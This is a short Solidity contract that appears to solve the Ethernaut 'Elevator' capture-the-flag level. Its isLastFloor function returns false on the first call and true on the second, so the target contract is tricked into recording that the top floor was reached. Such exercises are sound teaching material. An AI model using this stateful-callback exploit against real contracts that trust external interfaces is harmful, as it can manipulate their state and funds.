// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;


interface IElevator{
    function goTo(uint _floor) external;
}
 
contract Solution {
    
    IElevator instant;
    bool top;
    
    constructor(address _instant) public {
        instant = IElevator(_instant);    
    }
    
    function hack() public {
        instant.goTo(3);
    }
    
    function isLastFloor(uint) public returns (bool) {
      if (! top) {
        top = true;
        return false;
      } else {
        return true;
      }
    }
}

